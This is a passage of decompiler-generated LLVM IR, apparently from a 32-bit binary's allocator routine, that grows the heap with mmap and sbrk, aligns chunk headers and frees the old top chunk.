  store i32 %v1_8052bcc, i32* @ecx, align 4
  %v1_8052bcf = load i32, i32* @global_var_8068bec.738, align 4
  %v7_8052bcf = icmp ult i32 %v1_8052bf2, %v1_8052bcf
  br i1 %v7_8052bcf, label %dec_label_pc_8052caa, label %dec_label_pc_8052bdf

dec_label_pc_8052bdf:                             ; preds = %dec_label_pc_8052bc8
  %v0_8052bdf = load i32, i32* @global_var_8068bf0.739, align 16
  store i32 %v0_8052bdf, i32* %eax.global-to-local, align 4
  %v1_8052be4 = load i32, i32* @global_var_8068bf4.740, align 4
  %v5_8052bea = icmp slt i32 %v0_8052bdf, %v1_8052be4
  br i1 %v5_8052bea, label %dec_label_pc_8052bf0, label %dec_label_pc_8052caa

dec_label_pc_8052bf0:                             ; preds = %dec_label_pc_8052bdf
  %v2_8052bf2 = add i32 %v1_8052bf2, 10
  %v3_8052bf2 = add i32 %v2_8052bf2, %v0_8052b9b
  %v1_8052bf6 = sub i32 0, %v0_8052b9b
  store i32 %v1_8052bf6, i32* %eax.global-to-local, align 4
  %v2_8052bf8 = and i32 %v3_8052bf2, %v1_8052bf6
  store i32 %v2_8052bf8, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8052bf8, %v1_8052bf2
  br i1 %tmp139, label %dec_label_pc_8052c04, label %dec_label_pc_8052caa

dec_label_pc_8052c04:                             ; preds = %dec_label_pc_8052bf0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052c11 = call i32 @mmap(i32 0, i32 %v2_8052bf8, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052bcc, i32 %v1_8052bcc)
  store i32 %v8_8052c11, i32* %eax.global-to-local, align 4
  %v10_8052c19 = icmp eq i32 %v8_8052c11, -1
  store i32 %v8_8052c11, i32* %edx.global-to-local, align 4
  br i1 %v10_8052c19, label %dec_label_pc_8052c04.dec_label_pc_8052caa_crit_edge, label %dec_label_pc_8052c24

dec_label_pc_8052c04.dec_label_pc_8052caa_crit_edge: ; preds = %dec_label_pc_8052c04
  %v0_8052caa.pre = load i32, i32* @global_var_80688cc.732, align 4
  br label %dec_label_pc_8052caa

dec_label_pc_8052c24:                             ; preds = %dec_label_pc_8052c04
  %v1_8052c26 = urem i32 %v8_8052c11, 8
  %v2_8052c26 = icmp eq i32 %v1_8052c26, 0
  store i32 %v1_8052c26, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052c26, label %dec_label_pc_8052c3f, label %dec_label_pc_8052c2b

dec_label_pc_8052c2b:                             ; preds = %dec_label_pc_8052c24
  %v0_8052c30 = load i32, i32* @ebx, align 4
  %v2_8052c32 = sub nsw i32 8, %v1_8052c26
  store i32 %v2_8052c32, i32* %eax.global-to-local, align 4
  %v2_8052c34 = add i32 %v2_8052c32, %v8_8052c11
  store i32 %v2_8052c34, i32* @ecx, align 4
  %v2_8052c37 = sub i32 %v0_8052c30, %v2_8052c32
  store i32 %v2_8052c37, i32* %esi.global-to-local, align 4
  %v2_8052c39 = inttoptr i32 %v2_8052c34 to i32*
  store i32 %v2_8052c32, i32* %v2_8052c39, align 4
  br label %dec_label_pc_8052c49

dec_label_pc_8052c3f:                             ; preds = %dec_label_pc_8052c24
  store i32 %v8_8052c11, i32* @ecx, align 4
  %v1_8052c41 = inttoptr i32 %v8_8052c11 to i32*
  store i32 0, i32* %v1_8052c41, align 4
  br label %dec_label_pc_8052c49

dec_label_pc_8052c49:                             ; preds = %dec_label_pc_8052c2b, %dec_label_pc_8052c3f
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052c2b ], [ @ebx, %dec_label_pc_8052c3f ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052c49 = or i32 %storemerge, 2
  %v1_8052c4c = load i32, i32* @ecx, align 4
  %v2_8052c4c = add i32 %v1_8052c4c, 4
  %v3_8052c4c = inttoptr i32 %v2_8052c4c to i32*
  store i32 %v1_8052c49, i32* %v3_8052c4c, align 4
  %v0_8052c4f = load i32, i32* @global_var_8068bf0.739, align 16
  %v0_8052c54 = load i32, i32* @global_var_8068c10.741, align 16
  %v1_8052c5a = add i32 %v0_8052c4f, 1
  %v1_8052c5b = load i32, i32* @global_var_8068bf8.742, align 8
  %v2_8052c5b = sub i32 %v1_8052c5a, %v1_8052c5b
  %v8_8052c5b = xor i32 %v1_8052c5b, %v1_8052c5a
  %v9_8052c5b = xor i32 %v2_8052c5b, %v1_8052c5a
  %v10_8052c5b = and i32 %v9_8052c5b, %v8_8052c5b
  %v11_8052c5b = icmp slt i32 %v10_8052c5b, 0
  %v12_8052c5b = icmp eq i32 %v2_8052c5b, 0
  %v13_8052c5b = icmp slt i32 %v2_8052c5b, 0
  store i32 %v1_8052c5a, i32* @global_var_8068bf0.739, align 16
  %v3_8052c66 = icmp ne i1 %v13_8052c5b, %v11_8052c5b
  %v4_8052c66 = or i1 %v12_8052c5b, %v3_8052c66
  %v7_8052c66 = select i1 %v4_8052c66, i32 %v1_8052c5b, i32 %v1_8052c5a
  store i32 %v7_8052c66, i32* @global_var_8068bf8.742, align 8
  %v0_8052c72 = load i32, i32* @global_var_8068c04.743, align 4
  %v1_8052c77 = load i32, i32* @ebx, align 4
  %v2_8052c77 = add i32 %v1_8052c77, %v0_8052c72
  store i32 %v2_8052c77, i32* @global_var_8068c04.743, align 4
  %tmp86 = icmp ule i32 %v2_8052c77, %v0_8052c54
  %v5_8052c84 = select i1 %tmp86, i32 %v0_8052c54, i32 %v2_8052c77
  store i32 %v5_8052c84, i32* @edx, align 4
  %v1_8052c87 = load i32, i32* @global_var_8068c08.744, align 8
  %v2_8052c87 = add i32 %v1_8052c87, %v2_8052c77
  store i32 %v5_8052c84, i32* @global_var_8068c10.741, align 16
  %v1_8052c93 = load i32, i32* @global_var_8068c14.745, align 4
  %tmp140 = icmp ule i32 %v2_8052c87, %v1_8052c93
  %v5_8052c99 = select i1 %tmp140, i32 %v1_8052c93, i32 %v2_8052c87
  store i32 %v5_8052c99, i32* %eax.global-to-local, align 4
  store i32 %v5_8052c99, i32* @global_var_8068c14.745, align 4
  br label %dec_label_pc_8052b55

dec_label_pc_8052caa:                             ; preds = %dec_label_pc_8052bf0, %dec_label_pc_8052c04.dec_label_pc_8052caa_crit_edge, %dec_label_pc_8052bdf, %dec_label_pc_8052bc8
  %v0_8052caa = phi i32 [ %v0_8052caa.pre, %dec_label_pc_8052c04.dec_label_pc_8052caa_crit_edge ], [ %v0_8052b5d, %dec_label_pc_8052bdf ], [ %v0_8052b5d, %dec_label_pc_8052bf0 ], [ %v0_8052b5d, %dec_label_pc_8052bc8 ]
  store i32 %v0_8052caa, i32* %eax.global-to-local, align 4
  %v1_8052cb3 = add i32 %v0_8052caa, 4
  %v2_8052cb3 = inttoptr i32 %v1_8052cb3 to i32*
  %v3_8052cb3 = load i32, i32* %v2_8052cb3, align 4
  %v1_8052cba = and i32 %v3_8052cb3, -4
  %v2_8052cba = icmp eq i32 %v1_8052cba, 0
  store i32 %v1_8052cba, i32* @ebp, align 4
  %v1_8052cc0 = load i32, i32* @global_var_8068be8.746, align 8
  %v0_8052cca = load i8, i8* @global_var_8068c00.747, align 1024
  %v1_8052cca = urem i8 %v0_8052cca, 2
  %v2_8052cca = icmp eq i8 %v1_8052cca, 0
  %v1_8052cd1 = icmp eq i1 %v2_8052cca, false
  %v1_8052cba.op = sub i32 0, %v1_8052cba
  %v2_8052cc8.neg = select i1 %v1_8052cd1, i32 %v1_8052cba.op, i32 0
  %v2_8052cc0 = add i32 %v1_8052bcc, %v1_8052b6a
  %v4_8052cd1 = add i32 %v2_8052cc0, %v1_8052cc0
  %v5_8052cd8 = add i32 %v4_8052cd1, %v2_8052cc8.neg
  store i32 %v5_8052cd8, i32* %eax.global-to-local, align 4
  %v1_8052cdc = sub i32 0, %v0_8052b9b
  store i32 %v1_8052cdc, i32* @edx, align 4
  %v2_8052ce0 = and i32 %v5_8052cd8, %v1_8052cdc
  store i32 %v2_8052ce0, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8052ce0, 1
  br i1 %tmp87, label %dec_label_pc_8052cfe, label %dec_label_pc_8052ce8

dec_label_pc_8052ce8:                             ; preds = %dec_label_pc_8052caa
  store i32 %v2_8052ce0, i32* %stack_var_-92, align 4
  %v1_8052cec = call i32 @__GI_sbrk(i32 %v2_8052ce0)
  store i32 %v1_8052cec, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8052cf7 = icmp eq i32 %v1_8052cec, -1
  store i32 %v1_8052cec, i32* @ebx, align 4
  %v1_8052cfc = icmp eq i1 %v10_8052cf7, false
  br i1 %v1_8052cfc, label %dec_label_pc_8052d55, label %dec_label_pc_8052ce8.dec_label_pc_8052cfe_crit_edge

dec_label_pc_8052ce8.dec_label_pc_8052cfe_crit_edge: ; preds = %dec_label_pc_8052ce8
  %v0_8052cfe.pre = load i8, i8* @global_var_8068c00.747, align 1024
  br label %dec_label_pc_8052cfe

dec_label_pc_8052cfe:                             ; preds = %dec_label_pc_8052ce8.dec_label_pc_8052cfe_crit_edge, %dec_label_pc_8052caa
  %v0_8052d2b = phi i32 [ -1, %dec_label_pc_8052ce8.dec_label_pc_8052cfe_crit_edge ], [ %v1_8052cdc, %dec_label_pc_8052caa ]
  %v0_8052cfe = phi i8 [ %v0_8052cfe.pre, %dec_label_pc_8052ce8.dec_label_pc_8052cfe_crit_edge ], [ %v0_8052cca, %dec_label_pc_8052caa ]
  %v1_8052cfe = urem i8 %v0_8052cfe, 2
  %v2_8052cfe = icmp eq i8 %v1_8052cfe, 0
  br i1 %v2_8052cfe, label %dec_label_pc_8052cfe.dec_label_pc_8052d13_crit_edge, label %dec_label_pc_8052d07

dec_label_pc_8052cfe.dec_label_pc_8052d13_crit_edge: ; preds = %dec_label_pc_8052cfe
  %v0_8052d13.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052d13

dec_label_pc_8052d07:                             ; preds = %dec_label_pc_8052cfe
  %v2_8052d0b = add i32 %v1_8052cba, %v1_8052bcc
  store i32 %v2_8052d0b, i32* %eax.global-to-local, align 4
  %v0_8052d0d = load i32, i32* @esi, align 4
  %v2_8052d0d = add i32 %v0_8052d0d, %v2_8052d0b
  %v5_8052d0f = and i32 %v2_8052d0d, %v1_8052cdc
  store i32 %v5_8052d0f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052d13

dec_label_pc_8052d13:                             ; preds = %dec_label_pc_8052cfe.dec_label_pc_8052d13_crit_edge, %dec_label_pc_8052d07
  %v3_8052d1e = phi i32 [ %v0_8052d13.pre, %dec_label_pc_8052cfe.dec_label_pc_8052d13_crit_edge ], [ %v5_8052d0f, %dec_label_pc_8052d07 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8052d1e, 1048576
  %v5_8052d1e = select i1 %tmp88, i32 1048576, i32 %v3_8052d1e
  store i32 %v5_8052d1e, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8052d1e, %v1_8052bf2
  br i1 %tmp141, label %dec_label_pc_8052d2b, label %dec_label_pc_8052f70

dec_label_pc_8052d2b:                             ; preds = %dec_label_pc_8052d13
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052d38 = call i32 @mmap(i32 0, i32 %v5_8052d1e, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052d2b, i32 %v0_8052d2b)
  store i32 %v8_8052d38, i32* %eax.global-to-local, align 4
  %v10_8052d40 = icmp eq i32 %v8_8052d38, -1
  store i32 %v8_8052d38, i32* @ebx, align 4
  br i1 %v10_8052d40, label %dec_label_pc_8052f70, label %dec_label_pc_8052d4b

dec_label_pc_8052d4b:                             ; preds = %dec_label_pc_8052d2b
  %v0_8052d4b = load i8, i8* @global_var_8068c00.747, align 1
  %v2_8052d4b = and i8 %v0_8052d4b, -2
  store i8 %v2_8052d4b, i8* @global_var_8068c00.747, align 1024
  %v1_8052d52 = load i32, i32* @esi, align 4
  %v2_8052d52 = add i32 %v1_8052d52, %v8_8052d38
  store i32 %v2_8052d52, i32* @edx, align 4
  br label %dec_label_pc_8052d55

dec_label_pc_8052d55:                             ; preds = %dec_label_pc_8052ce8, %dec_label_pc_8052d4b
  %v0_8052e1c = phi i32 [ -1, %dec_label_pc_8052ce8 ], [ %v2_8052d52, %dec_label_pc_8052d4b ]
  %v0_8052e2a = phi i32 [ %v1_8052cec, %dec_label_pc_8052ce8 ], [ %v8_8052d38, %dec_label_pc_8052d4b ]
  %v10_8052d55 = icmp eq i32 %v0_8052e2a, -1
  br i1 %v10_8052d55, label %dec_label_pc_8052f70, label %dec_label_pc_8052d5e

dec_label_pc_8052d5e:                             ; preds = %dec_label_pc_8052d55
  %v0_8052d62 = load i32, i32* @global_var_8068c08.744, align 8
  %v1_8052d62 = load i32, i32* @esi, align 4
  %v2_8052d62 = add i32 %v1_8052d62, %v0_8052d62
  store i32 %v2_8052d62, i32* @global_var_8068c08.744, align 8
  %v2_8052d68 = add i32 %v1_8052cba, %v0_8052caa
  store i32 %v2_8052d68, i32* %ecx.global-to-local, align 4
  %v2_8052d6a = sub i32 %v0_8052e2a, %v2_8052d68
  %v7_8052d6a = icmp ult i32 %v0_8052e2a, %v2_8052d68
  %v12_8052d6a = icmp eq i32 %v2_8052d6a, 0
  %v1_8052d6c = icmp eq i1 %v12_8052d6a, false
  br i1 %v1_8052d6c, label %dec_label_pc_8052d85, label %dec_label_pc_8052d6e

dec_label_pc_8052d6e:                             ; preds = %dec_label_pc_8052d5e
  %v10_8052d6e = icmp eq i32 %v0_8052e1c, -1
  %v1_8052d71 = icmp eq i1 %v10_8052d6e, false
  br i1 %v1_8052d71, label %dec_label_pc_8052d85, label %dec_label_pc_8052d73

dec_label_pc_8052d73:                             ; preds = %dec_label_pc_8052d6e
  store i32 %v0_8052caa, i32* %ecx.global-to-local, align 4
  %v2_8052d77 = add i32 %v1_8052d62, %v1_8052cba
  %v1_8052d7a = or i32 %v2_8052d77, 1
  store i32 %v1_8052d7a, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d7a, i32* %v2_8052cb3, align 4
  br label %dec_label_pc_8052eb2

dec_label_pc_8052d85:                             ; preds = %dec_label_pc_8052d6e, %dec_label_pc_8052d5e
  %v0_8052d85 = load i8, i8* @global_var_8068c00.747, align 1
  %v1_8052d85 = sext i8 %v0_8052d85 to i32
  store i32 %v1_8052d85, i32* %eax.global-to-local, align 4
  %v2_8052d8a = urem i8 %v0_8052d85, 2
  %v3_8052d8a = icmp eq i8 %v2_8052d8a, 0
  br i1 %v3_8052d8a, label %dec_label_pc_8052d9e, label %dec_label_pc_8052d8e

dec_label_pc_8052d8e:                             ; preds = %dec_label_pc_8052d85
  br i1 %v2_8052cba, label %dec_label_pc_8052d9e, label %dec_label_pc_8052d92

dec_label_pc_8052d92:                             ; preds = %dec_label_pc_8052d8e
  %v1_8052d94 = icmp eq i1 %v7_8052d6a, false
  br i1 %v1_8052d94, label %dec_label_pc_8052d9e, label %dec_label_pc_8052d96

dec_label_pc_8052d96:                             ; preds = %dec_label_pc_8052d92
  %v1_8052d96 = and i32 %v1_8052d85, -2
  %v4_8052d96 = trunc i32 %v1_8052d96 to i8
  store i32 %v1_8052d96, i32* %eax.global-to-local, align 4
  store i8 %v4_8052d96, i8* @global_var_8068c00.747, align 1024
  br label %dec_label_pc_8052d9e

dec_label_pc_8052d9e:                             ; preds = %dec_label_pc_8052d92, %dec_label_pc_8052d8e, %dec_label_pc_8052d85, %dec_label_pc_8052d96
  %v0_8052d9e = phi i8 [ %v0_8052d85, %dec_label_pc_8052d92 ], [ %v0_8052d85, %dec_label_pc_8052d8e ], [ %v0_8052d85, %dec_label_pc_8052d85 ], [ %v4_8052d96, %dec_label_pc_8052d96 ]
  %v1_8052d9e = urem i8 %v0_8052d9e, 2
  %v2_8052d9e = icmp eq i8 %v1_8052d9e, 0
  br i1 %v2_8052d9e, label %dec_label_pc_8052e1c, label %dec_label_pc_8052da7

dec_label_pc_8052da7:                             ; preds = %dec_label_pc_8052d9e
  br i1 %v2_8052cba, label %dec_label_pc_8052db5, label %dec_label_pc_8052dab

dec_label_pc_8052dab:                             ; preds = %dec_label_pc_8052da7
  store i32 %v2_8052d6a, i32* %eax.global-to-local, align 4
  %v2_8052daf = add i32 %v2_8052d62, %v2_8052d6a
  store i32 %v2_8052daf, i32* @global_var_8068c08.744, align 8
  br label %dec_label_pc_8052db5

dec_label_pc_8052db5:                             ; preds = %dec_label_pc_8052da7, %dec_label_pc_8052dab
  %v1_8052db7 = urem i32 %v0_8052e2a, 8
  %v2_8052db7 = icmp eq i32 %v1_8052db7, 0
  store i32 %v1_8052db7, i32* %edx.global-to-local, align 4
  %v1_8052dba = icmp eq i1 %v2_8052db7, false
  br i1 %v1_8052dba, label %dec_label_pc_8052dc2, label %dec_label_pc_8052dbc

dec_label_pc_8052dbc:                             ; preds = %dec_label_pc_8052db5
  store i32 %v0_8052e2a, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052dcc

dec_label_pc_8052dc2:                             ; preds = %dec_label_pc_8052db5
  %v2_8052dc7 = sub nsw i32 8, %v1_8052db7
  store i32 %v2_8052dc7, i32* %eax.global-to-local, align 4
  %v2_8052dc9 = add i32 %v2_8052dc7, %v0_8052e2a
  store i32 %v2_8052dc9, i32* @edi, align 4
  br label %dec_label_pc_8052dcc

dec_label_pc_8052dcc:                             ; preds = %dec_label_pc_8052dbc, %dec_label_pc_8052dc2
  %v0_8052dd9 = phi i32 [ 0, %dec_label_pc_8052dbc ], [ %v2_8052dc7, %dec_label_pc_8052dc2 ]
  %v2_8052dcc = add i32 %v1_8052d62, %v0_8052e2a
  %v2_8052dd9 = add i32 %v0_8052dd9, %v1_8052cba
  store i32 %v2_8052dd9, i32* %ecx.global-to-local, align 4
  %v2_8052ddc = add i32 %v2_8052dd9, %v2_8052dcc
  store i32 %v2_8052ddc, i32* %edx.global-to-local, align 4
  %v2_8052dde = add i32 %v2_8052ddc, %v1_8052bcc
  %v5_8052de1 = and i32 %v2_8052dde, %v1_8052cdc
  %v2_8052de8 = sub i32 %v5_8052de1, %v2_8052ddc
  store i32 %v2_8052de8, i32* %eax.global-to-local, align 4
  %v2_8052dea = add i32 %v2_8052de8, %v2_8052dd9
  store i32 %v2_8052dea, i32* @esi, align 4
  store i32 %v2_8052dea, i32* %stack_var_-92, align 4
  %v1_8052dee = call i32 @__GI_sbrk(i32 %v2_8052dea)
  store i32 %v1_8052dee, i32* %eax.global-to-local, align 4
  %v10_8052df6 = icmp eq i32 %v1_8052dee, -1
  store i32 %v1_8052dee, i32* %edx.global-to-local, align 4
  %v1_8052dfb = icmp eq i1 %v10_8052df6, false
  br i1 %v1_8052dfb, label %dec_label_pc_8052e0b, label %dec_label_pc_8052dfd

dec_label_pc_8052dfd:                             ; preds = %dec_label_pc_8052dcc
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052e02 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052e02, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e02, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052e3f

dec_label_pc_8052e0b:                             ; preds = %dec_label_pc_8052dcc
  %v1_8052e0b = load i32, i32* @ebx, align 4
  %v7_8052e0b = icmp ult i32 %v1_8052dee, %v1_8052e0b
  %v1_8052e0d = icmp eq i1 %v7_8052e0b, false
  br i1 %v1_8052e0d, label %dec_label_pc_8052e44, label %dec_label_pc_8052e0f

dec_label_pc_8052e0f:                             ; preds = %dec_label_pc_8052e0b
  %v0_8052e0f = load i8, i8* @global_var_8068c00.747, align 1
  %v2_8052e0f = and i8 %v0_8052e0f, -2
  store i8 %v2_8052e0f, i8* @global_var_8068c00.747, align 1024
  store i32 %v2_8052dcc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052e23

dec_label_pc_8052e1c:                             ; preds = %dec_label_pc_8052d9e
  %v10_8052e1c = icmp eq i32 %v0_8052e1c, -1
  br i1 %v10_8052e1c, label %dec_label_pc_8052e27, label %dec_label_pc_8052e21

dec_label_pc_8052e21:                             ; preds = %dec_label_pc_8052e1c
  store i32 %v0_8052e2a, i32* @edi, align 4
  br label %dec_label_pc_8052e23

dec_label_pc_8052e23:                             ; preds = %dec_label_pc_8052e0f, %dec_label_pc_8052e21
  %v0_8052e4447 = phi i32 [ %v2_8052dcc, %dec_label_pc_8052e0f ], [ %v0_8052e1c, %dec_label_pc_8052e21 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052e44

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052e1c
  store i32 %v0_8052e2a, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052e2e = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052e2e, i32* %edx.global-to-local, align 4
  %v1_8052e35 = load i32, i32* @ebx, align 4
  %v2_8052e35 = sub i32 %v1_8052e2e, %v1_8052e35
  %v1_8052e37 = load i32, i32* @esi, align 4
  %v2_8052e37 = sub i32 %v2_8052e35, %v1_8052e37
  store i32 %v2_8052e37, i32* %eax.global-to-local, align 4
  %v0_8052e39 = load i32, i32* @global_var_8068c08.744, align 8
  %v2_8052e39 = add i32 %v0_8052e39, %v2_8052e37
  store i32 %v2_8052e39, i32* @global_var_8068c08.744, align 8
  br label %dec_label_pc_8052e3f

dec_label_pc_8052e3f:                             ; preds = %dec_label_pc_8052dfd, %dec_label_pc_8052e27
  %v0_8052e4446 = phi i32 [ %v1_8052e02, %dec_label_pc_8052dfd ], [ %v1_8052e2e, %dec_label_pc_8052e27 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052e44

dec_label_pc_8052e44:                             ; preds = %dec_label_pc_8052e0b, %dec_label_pc_8052e23, %dec_label_pc_8052e3f
  %v0_8052e49 = phi i32 [ %v1_8052dee, %dec_label_pc_8052e0b ], [ %v0_8052e4447, %dec_label_pc_8052e23 ], [ %v0_8052e4446, %dec_label_pc_8052e3f ]
  %v10_8052e44 = icmp eq i32 %v0_8052e49, -1
  br i1 %v10_8052e44, label %dec_label_pc_8052eb2, label %dec_label_pc_8052e49

dec_label_pc_8052e49:                             ; preds = %dec_label_pc_8052e44
  %v1_8052e49 = load i32, i32* @edi, align 4
  %v2_8052e49 = sub i32 %v0_8052e49, %v1_8052e49
  store i32 %v2_8052e49, i32* %edx.global-to-local, align 4
  %v1_8052e4b = load i32, i32* @esi, align 4
  %v2_8052e4b = add i32 %v1_8052e4b, %v2_8052e49
  %v1_8052e4e = or i32 %v2_8052e4b, 1
  store i32 %v1_8052e4e, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e49, i32* @global_var_80688cc.732, align 4
  %v2_8052e57 = add i32 %v1_8052e49, 4
  %v3_8052e57 = inttoptr i32 %v2_8052e57 to i32*
  store i32 %v1_8052e4e, i32* %v3_8052e57, align 4
  %v0_8052e5a = load i32, i32* @global_var_8068c08.744, align 8
  %v1_8052e5a = load i32, i32* @esi, align 4
  %v2_8052e5a = add i32 %v1_8052e5a, %v0_8052e5a
  store i32 %v2_8052e5a, i32* @global_var_8068c08.744, align 8
  br i1 %v2_8052cba, label %dec_label_pc_8052eb2, label %dec_label_pc_8052e64

dec_label_pc_8052e64:                             ; preds = %dec_label_pc_8052e49
  store i32 %v0_8052caa, i32* %ecx.global-to-local, align 4
  %v1_8052e68 = add i32 %v1_8052cba, -12
  %v1_8052e6b = and i32 %v1_8052e68, -8
  store i32 %v1_8052e6b, i32* %eax.global-to-local, align 4
  %v1_8052e70 = or i32 %v1_8052e6b, 1
  store i32 %v1_8052e70, i32* %edx.global-to-local, align 4
  %v5_8052e73 = icmp ult i32 %v1_8052e6b, 15
  store i32 %v1_8052e70, i32* %v2_8052cb3, align 4
  %v0_8052e79 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e79 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e79 = add i32 %v0_8052e79, 4
  %v3_8052e79 = add i32 %v2_8052e79, %v1_8052e79
  %v4_8052e79 = inttoptr i32 %v3_8052e79 to i32*
  store i32 5, i32* %v4_8052e79, align 4
  %v0_8052e81 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e81 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e81 = add i32 %v0_8052e81, 8
  %v3_8052e81 = add i32 %v2_8052e81, %v1_8052e81
  %v4_8052e81 = inttoptr i32 %v3_8052e81 to i32*
  store i32 5, i32* %v4_8052e81, align 4
  br i1 %v5_8052e73, label %dec_label_pc_8052eb2, label %dec_label_pc_8052e8b

dec_label_pc_8052e8b:                             ; preds = %dec_label_pc_8052e64
  %v0_8052e8b = load i32, i32* @global_var_8068be4.748, align 4
  store i32 %v0_8052e8b, i32* @ebx, align 4
  %v0_8052e91 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e96 = add i32 %v0_8052e91, 8
  store i32 %v1_8052e96, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e96, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8068be4.748, align 4
  %v1_8052ea4 = call i32 @free(i32 %v1_8052e96)
  store i32 %v1_8052ea4, i32* %eax.global-to-local, align 4
  %v0_8052eac = load i32, i32* @ebx, align 4
  store i32 %v0_8052eac, i32* @global_var_8068be4.748, align 4
  br label %dec_label_pc_8052eb2

dec_label_pc_8052eb2:                             ; preds = %dec_label_pc_8052e64, %dec_label_pc_8052e49, %dec_label_pc_8052e44, %dec_label_pc_8052d73, %dec_label_pc_8052e8b
  %v0_8052eb2 = load i32, i32* @global_var_8068c08.744, align 8
  %v0_8052eb7 = load i32, i32* @global_var_8068c0c.749, align 4
  %v0_8052ec3 = load i32, i32* @global_var_80688cc.732, align 4
  store i32 %v0_8052ec3, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8052eb2, %v0_8052eb7
  %v5_8052ec9 = select i1 %tmp89, i32 %v0_8052eb7, i32 %v0_8052eb2
  store i32 %v5_8052ec9, i32* @edx, align 4
  %v1_8052ecc = load i32, i32* @global_var_8068c04.743, align 4
  %v2_8052ecc = add i32 %v1_8052ecc, %v0_8052eb2
  store i32 %v5_8052ec9, i32* @global_var_8068c0c.749, align 4
  %v1_8052ed8 = load i32, i32* @global_var_8068c14.745, align 4
  %tmp90 = icmp ule i32 %v2_8052ecc, %v1_8052ed8
  %v5_8052ede = select i1 %tmp90, i32 %v1_8052ed8, i32 %v2_8052ecc
  store i32 %v5_8052ede, i32* %eax.global-to-local, align 4
  store i32 %v5_8052ede, i32* @global_var_8068c14.745, align 4
  %v1_8052eea = add i32 %v0_8052ec3, 4
  %v2_8052eea = inttoptr i32 %v1_8052eea to i32*
  %v3_8052eea = load i32, i32* %v2_8052eea, align 4
  %v1_8052eed = and i32 %v3_8052eea, -4
  store i32 %v1_8052eed, i32* @ecx, align 4
  %v10_8052ef0 = icmp ult i32 %v1_8052eed, %v1_8052b6a
  br i1 %v10_8052ef0, label %dec_label_pc_8052f70, label %dec_label_pc_8052ef6

dec_label_pc_8052ef6:                             ; preds = %dec_label_pc_8052eb2
  store i32 %v1_8052bf2, i32* %esi.global-to-local, align 4
  %v2_8052efc = sub i32 %v1_8052eed, %v1_8052bf2
  store i32 %v2_8052efc, i32* %ecx.global-to-local, align 4
  %v2_8052efe = add i32 %v0_8052ec3, %v1_8052bf2
  store i32 %v2_8052efe, i32* @edx, align 4
  %v1_8052f01 = or i32 %v1_8052bf2, 1
  store i32 %v1_8052f01, i32* %eax.global-to-local, align 4
  store i32 %v2_8052efe, i32* @global_var_80688cc.732, align 4
  store i32 %v1_8052f01, i32* %v2_8052eea, align 4
  %v0_8052f0d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052f0d

dec_label_pc_8052f0d:                             ; preds = %dec_label_pc_8052b78, %dec_label_pc_8052ef6
  %v0_8052f0d = phi i32 [ %v5_8052b8b, %dec_label_pc_8052b78 ], [ %v0_8052f0d.pre, %dec_label_pc_8052ef6 ]
  %v1_8052f0d = or i32 %v0_8052f0d, 1
  store i32 %v1_8052f0d, i32* @ecx, align 4
  %v0_8052f10 = load i32, i32* @ebx, align 4
  %v1_8052f10 = add i32 %v0_8052f10, 8
  store i32 %v1_8052f10, i32* %ebx.global-to-local, align 4
  %v1_8052f13 = load i32, i32* @edx, align 4
  %v2_8052f13 = add i32 %v1_8052f13, 4
  %v3_8052f13 = inttoptr i32 %v2_8052f13 to i32*
  store i32 %v1_8052f0d, i32* %v3_8052f13, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f18:                             ; preds = %dec_label_pc_805292a
  %v5_8052f1e = sub i32 %v1_805290d, %v1_8052bf2
  store i32 %v5_8052f1e, i32* %eax.global-to-local, align 4
  %v2_8052f22 = add i32 %v0_80529d8118, %v1_8052bf2
  store i32 %v2_8052f22, i32* @edx, align 4
  %v1_8052f26 = or i32 %v1_8052bf2, 1
  store i32 %v2_8052f22, i32* @global_var_80688d0.733, align 16
  store i32 %v1_8052f26, i32* %v2_8052907, align 4
  %v0_8052f32 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f34 = or i32 %v0_8052f32, 1
  store i32 %v1_8052f34, i32* @ecx, align 4
  %v0_8052f37 = load i32, i32* @edx, align 4
  store i32 %v0_8052f37, i32* @global_var_80688dc.750, align 4
  store i32 %v0_8052f37, i32* @global_var_80688e0.735, align 32
  %v1_8052f43 = add i32 %v0_8052f37, 8
  %v2_8052f43 = inttoptr i32 %v1_8052f43 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052f43, align 4
  %v0_8052f4a = load i32, i32* @edx, align 4
